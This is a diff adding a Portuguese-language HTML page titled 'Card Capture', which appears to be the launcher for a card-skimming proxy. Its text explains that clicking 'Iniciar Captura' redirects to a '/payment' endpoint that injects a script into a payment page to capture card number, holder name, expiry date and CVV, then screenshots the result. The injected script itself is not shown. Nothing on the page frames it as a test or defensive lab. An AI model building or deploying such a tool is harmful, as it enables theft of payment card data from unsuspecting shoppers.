@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Card Capture - Payment Monitor</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu,
+          Cantarell, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: white;
+        border-radius: 12px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        padding: 40px;
+        max-width: 500px;
+        text-align: center;
+      }
+
+      h1 {
+        color: #333;
+        margin-bottom: 10px;
+        font-size: 28px;
+      }
+
+      p {
+        color: #666;
+        margin-bottom: 30px;
+        line-height: 1.6;
+      }
+
+      .button {
+        display: inline-block;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 14px 40px;
+        border-radius: 8px;
+        text-decoration: none;
+        font-weight: 600;
+        cursor: pointer;
+        border: none;
+        font-size: 16px;
+        transition:
+          transform 0.2s,
+          box-shadow 0.2s;
+      }
+
+      .button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+      }
+
+      .button:active {
+        transform: translateY(0);
+      }
+
+      .info {
+        background: #f0f4ff;
+        border-left: 4px solid #667eea;
+        padding: 15px;
+        margin-top: 30px;
+        text-align: left;
+        border-radius: 4px;
+        font-size: 14px;
+        color: #555;
+      }
+
+      .info strong {
+        color: #667eea;
+      }
+
+      .spinner {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #667eea;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        margin-right: 10px;
+        vertical-align: middle;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-state {
+        display: none;
+      }
+
+      .loading-state.active {
+        display: block;
+      }
+
+      .loading-state p {
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="initial-state">
+        <h1>🛡️ Card Capture</h1>
+        <p>
+          Monitor automático de formulários de pagamento com captura segura de
+          dados
+        </p>
+        <button class="button" onclick="startCapture()">Iniciar Captura</button>
+      </div>
+
+      <div class="loading-state" id="loadingState">
+        <div style="font-size: 48px; margin-bottom: 20px">⏳</div>
+        <h1>Carregando...</h1>
+        <p>
+          <span class="spinner"></span>
+          Preparando página de pagamento com monitoramento ativo
+        </p>
+        <p style="font-size: 13px; color: #999; margin-top: 20px">
+          Você será redirecionado automaticamente...
+        </p>
+      </div>
+
+      <div class="info">
+        <strong>ℹ️ Como funciona:</strong>
+        <br /><br />
+        Ao clicar em "Iniciar Captura", você será redirecionado para a página de
+        pagamento. Um script será automaticamente injetado para:
+        <br /><br />
+        ✅ Detectar número do cartão (16 dígitos)
+        <br />
+        ✅ Capturar nome do titular
+        <br />
+        ✅ Obter data de validade (4 dígitos)
+        <br />
+        ✅ Registrar CVV (3 dígitos)
+        <br /><br />
+        Quando todos os dados forem capturados, um screenshot é tirado
+        automaticamente.
+      </div>
+    </div>
+
+    <script>
+      function startCapture() {
+        const initialState = document.querySelector(".initial-state");
+        const loadingState = document.getElementById("loadingState");
+
+        // Mostra estado de carregamento
+        initialState.style.display = "none";
+        loadingState.classList.add("active");
+
+        // Aguarda 2 segundos e redireciona para o proxy
+        setTimeout(() => {
+          // Redireciona para o endpoint do proxy que injeta o script automaticamente
+          window.location.href = "/payment";
+        }, 2000);
+      }
+    </script>
+  </body>
+</html>
